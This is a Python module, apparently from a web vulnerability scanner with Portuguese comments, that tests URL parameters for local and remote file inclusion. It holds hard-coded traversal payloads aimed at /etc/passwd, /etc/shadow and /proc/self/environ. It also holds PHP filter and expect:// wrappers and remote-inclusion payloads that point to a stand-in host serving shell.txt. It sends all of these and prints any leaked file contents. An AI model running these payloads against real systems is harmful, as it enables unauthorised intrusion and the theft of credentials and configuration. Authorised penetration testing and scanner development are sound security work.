# modules/web/lfi.py
import requests
import base64
from urllib.parse import quote, urljoin
import re

class LFITester:
    def __init__(self):
        self.payloads = self.load_lfi_payloads()
        self.wrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'expect://id',
            'data://text/plain;base64,',
            'input:///etc/passwd'
        ]
        
    def load_lfi_payloads(self):
        """Carrega payloads LFI"""
        try:
            with open('wordlists/payloads/lfi.txt', 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [
                '../../../../etc/passwd',
                '....//....//....//....//etc/passwd',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '/proc/self/environ',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/issue',
                '/etc/motd',
                '/etc/httpd/conf/httpd.conf',
                '/etc/apache2/apache2.conf',
                '/proc/self/cmdline',
                '/proc/self/status',
                '/proc/self/fd/0',
                '/proc/self/fd/1',
                '/proc/self/fd/2'
            ]

    def test_lfi(self, url, param, payload):
        """Testa LFI básico"""
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=8, verify=False)
            content = response.text.lower()
            
            # Indicadores de arquivos do sistema
            indicators = [
                'root:', 'daemon:', 'bin:', 'sys:', 'sync:',
                '[boot loader]', '[operating systems]',
                '<?php', '#!/bin/bash', '# /etc/fstab',
                'apache', 'nginx', 'lighttpd'
            ]
            
            if any(indicator in content for indicator in indicators):
                return True, response.text[:500]  # Retorna primeiros 500 chars
                
        except:
            pass
            
        return False, None

    def test_with_wrappers(self, url, param, file_path):
        """Testa LFI com wrappers PHP"""
        results = {}
        
        for wrapper in self.wrappers:
            payload = f"{wrapper}{file_path}"
            test_url = f"{url}?{param}={quote(payload)}"
            
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                if wrapper.startswith('php://filter') and 'base64' in wrapper:
                    # Tenta decodificar base64
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if any(keyword in decoded.lower() for keyword in ['root:', '<?php', '<html']):
                            results[wrapper] = decoded[:500]
                    except:
                        pass
                elif response.status_code != 404 and len(response.text) > 0:
                    results[wrapper] = response.text[:500]
                    
            except:
                continue
                
        return results

    def test_rfi(self, url, param):
        """Testa Remote File Inclusion"""
        test_payloads = [
            'http://evil.com/shell.txt',
            '\\\\evil.com\\share\\shell.txt',
            'ftp://evil.com/shell.txt'
        ]
        
        for payload in test_payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                response = requests.get(test_url, timeout=8, verify=False)
                # Verifica se há conteúdo suspeito
                if 'evil.com' in response.text or '<?php' in response.text:
                    return True, payload
            except:
                pass
                
        return False, None

    def scan_lfi(self, url):
        """Scan completo de LFI/RFI"""
        print(f"[+] Testando LFI/RFI em: {url}")
        
        vulnerabilities = []
        
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            query_params = dict(param.split('=') for param in query_string.split('&') if '=' in param)
            
            for param, original_value in query_params.items():
                print(f"  [+] Testando parâmetro: {param}")
                
                # Testa LFI básico
                for payload in self.payloads:
                    is_vuln, content = self.test_lfi(base_url, param, payload)
                    if is_vuln:
                        vulnerabilities.append(f"LFI em {param}: {payload}")
                        print(f"    [!] VULNERÁVEL: {payload}")
                        if content:
                            print(f"    [+] Conteúdo: {content[:200]}...")
                
                # Testa com wrappers
                for test_file in ['/etc/passwd', 'index.php', 'config.php']:
                    wrapper_results = self.test_with_wrappers(base_url, param, test_file)
                    if wrapper_results:
                        for wrapper, content in wrapper_results.items():
                            vulnerabilities.append(f"LFI com wrapper {wrapper} em {param}")
                            print(f"    [!] VULNERÁVEL com wrapper: {wrapper}")
                
                # Testa RFI
                is_rfi, payload = self.test_rfi(base_url, param)
                if is_rfi:
                    vulnerabilities.append(f"RFI em {param}: {payload}")
                    print(f"    [!] RFI VULNERÁVEL: {payload}")
        
        return vulnerabilities